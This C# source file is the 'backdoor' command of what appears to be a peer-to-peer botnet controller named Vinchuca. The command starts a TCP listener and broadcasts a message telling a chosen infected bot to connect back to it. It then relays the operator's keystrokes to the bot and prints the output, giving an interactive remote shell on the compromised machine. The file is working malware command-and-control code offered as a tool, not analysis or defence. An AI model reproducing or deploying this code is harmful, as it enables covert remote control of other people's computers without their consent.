using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Mono.Options;
using Vinchuca;
using Vinchuca.Network;
using Vinchuca.Network.Protocol.Messages.Command;
using Vinchuca.Utils;

namespace REPL.Commands
{
    class BackdoorCommand : Command
    {
        private readonly Agent _agent;
        private readonly CommandLineReader _repl;
        public bool ShowHelp { get; set; }

        public BackdoorCommand(Agent agent, CommandLineReader repl)
            : base("backdoor", "Opens a session with a remote agent to execute commands.")
        {
            _agent = agent;
            _repl = repl;
            Options = new OptionSet() {
                "usage: backdoor <identifier>",
                "",
                "Opens a session with a remote agent to execute shell commands.",
                "eg: backdoor 028d9a9a9b76a755f6262409d86c7e05",
                { "help|h|?","Show this message and exit.", v => ShowHelp = v != null },
            };
            _repl.AddAutocompletionWords("backdoor");
        }


        public override int Invoke(IEnumerable<string> args)
        {
            try
            {
                var extra = Options.Parse(args);
                if (ShowHelp)
                {
                    Options.WriteOptionDescriptions(CommandSet.Out);
                    return 0;
                }
                if (extra.Count == 0)
                {
                    Console.WriteLine("commands: Missing required argument `BOT-IDENTIFIER`.");
                    Console.WriteLine("commands: Use `help backdoor` for details.");
                    return 1;
                }

                var botId = extra[0];
                var targetBotId = BotIdentifier.Parse(botId);
                var peerInfo = _agent.PeerList[targetBotId];
                var controllerIp = IPAddressUtils.BehingNAT(peerInfo.EndPoint.Address)
                    ? IPAddressUtils.GetLocalIPAddress()
                    : _agent.PublicIP;

                var port = new Random().Next(33000, 33999);
                var serverEndpoint = new IPEndPoint(controllerIp, port);
                var server = new TcpListener(serverEndpoint);
                server.Start();

                var backdoorMessage = new BackdoorMessage()
                {
                    TargetBotId = BotIdentifier.Parse(botId),
                    ControllerEndpoint = new IPEndPoint( controllerIp, port)
                };
                _agent.MessagesManager.Broadcast(backdoorMessage, 6);

                var client = server.AcceptTcpClient();
                var stream = client.GetStream();

                Console.WriteLine("Connected!");

                var writer = new StreamWriter(stream) { AutoFlush = true };
                var reader = new StreamReader(stream);

                ThreadPool.QueueUserWorkItem(s1 =>
                {
                    var array = new char[1024];
                    try
                    {
                        int count;
                        while ((count = reader.Read(array, 0, array.Length)) != 0)
                        {
                            Console.Write(new string(array, 0, count));
                        }
                    }
                    catch (Exception e)
                    {
                        // ignored
                    }
                });

                var bgColor = Console.BackgroundColor;
                var fgColor = Console.ForegroundColor;
                //Console.BackgroundColor = ConsoleColor.Blue;
                Console.ForegroundColor = ConsoleColor.Cyan;

                Console.CursorVisible = true;
                ConsoleKeyInfo k;
                var cursorLeft = 0;
                var cmd = "";
                while (cmd != "exit")
                {
                    k = Console.ReadKey(true);
                    if (k.Key == ConsoleKey.Enter)
                    {
                        Console.CursorLeft -= cursorLeft;
                        cursorLeft = 0;
                        writer.Write('\n');
                        cmd = "";
                    }
                    else
                    {
                        cmd += k.KeyChar;
                        writer.Write(k.KeyChar);
                        Console.Write(k.KeyChar.ToString());
                        cursorLeft++;
                    }
                }

                client.Close();
                server.Stop();
                Console.BackgroundColor = bgColor;
                Console.ForegroundColor = fgColor;
                Console.WriteLine("\nbackdoor closed. Good bye, master!");
                Console.WriteLine();

                return 0;
            }
            catch (Exception e)
            {
                //                _repl.Console.WriteLine("commands: {0}", CommandDemo.Verbosity >= 1 ? e.ToString() : e.Message);
                return 1;
            }
        }
    }
}
